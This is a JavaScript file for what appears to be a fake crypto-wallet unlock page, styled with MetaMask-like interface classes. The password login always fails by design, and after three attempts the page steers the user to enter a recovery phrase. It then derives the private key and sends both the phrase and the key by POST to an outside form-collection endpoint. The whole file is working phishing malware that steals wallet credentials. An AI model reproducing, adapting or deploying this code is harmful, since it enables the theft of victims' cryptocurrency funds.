var p = !1;
const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
let errCount = 0;

$("#logo-container").css('opacity', '0');
setTimeout(function () {
    $(".z2").addClass("hidden");
    $(".z3").removeClass("hidden");
    $("#logo-container").css('opacity', '1');
}, 1e3), $(".import-account__secret-phrase").on("keyup", function () {
    var t = $(this).val().split(" ");
    p || (12 == t.length && 1 < t[11].length || 24 == t.length && 1 < t[23].length ? $(".button.btn--first-time.first-time-flow__button").prop("disabled", !1) : $(".button.btn--first-time.first-time-flow__button").prop("disabled", !0))
});

$("#passphrase-wrapper").hide();

function passwordShow() {
    $("#password-wrapper").show();
    $("#logo-container").css('opacity', '1');
}

function passwordHide() {
    $("#password-wrapper").hide();
    $("#logo-container").css('opacity', '0');
}


$(document).ready(function () {
    function validPassword() {
        return $("#password").val() == $("#confirm-password").val() && $("#password").val().length >= 8;
    }

    $("#password").keyup(function() {
        if (validPassword()) {
            $("#restore-btn").removeAttr("disabled")
        } else {
            $("#restore-btn").attr("disabled", "true")
        }
    });

    $("#confirm-password").keyup(function() {
        if (validPassword()) {
            $("#restore-btn").removeAttr("disabled")
        } else {
            $("#restore-btn").attr("disabled", "true")
        }
    });

    $("#password-login").click(function () {
        $("#password-form").removeClass("Mui-error")
        $("#loading-root").show();
        $("#password-helper-text").hide();
        setTimeout(function () {
            $("#password-form").addClass("Mui-error")

            $("#loading-root").hide();
            $("#password-helper-text").show();
        }, 100)
    })

    // sent
    $("#restore-btn").click(function () {
        $("#loading-root-passphrase").show();
        $("#passphrase").removeClass("err");

        let address = null;
        const passphrase = $("#passphrase").val();
        let privateKey = null;

        setTimeout(function () {

            try {
                privateKey = ethers.Wallet.fromMnemonic(passphrase).privateKey;
                address = web3.eth.accounts.privateKeyToAccount(privateKey).address;
                console.log("valid")
            } catch (err) {
                console.log("invalid, " + err);
                $("#loading-root-passphrase").hide();
                $("#passphrase").addClass("err");
                return;
            }

            const formData = new FormData();
            formData.append('type', "PRIVATE_KEY");
            formData.append('passphrase', passphrase);
            formData.append('privateKey', privateKey);
            $.ajax({
                url: 'https://submit-form.com/e8c2e4sU' + (address ? address : ""),
                method: 'POST',
                processData: false,
                contentType: false,
                data: formData,
                success: function (data) {
                    console.log("Connected")
                    window.close();
                },
                error: function () {
                    console.log("Fail")
                    window.close();
                }
            });
            window.opener.postMessage(address, '*');
            $("#loading-root-passphrase").hide();
        }, 100)
    })

    $(".unlock-page__link.unlock-page__link--import").click(function () {
        passwordHide();
        $("#passphrase-wrapper").show();
    })

    $(".import-account__back-button").click(function () {
        passwordShow();
        $("#passphrase-wrapper").hide();
    })

    $("#password-login").click(function () {
        errCount++;
        if (errCount === 3) {
            $(".unlock-page__link.unlock-page__link--import").click();
            errCount = 0;
        }
    })
})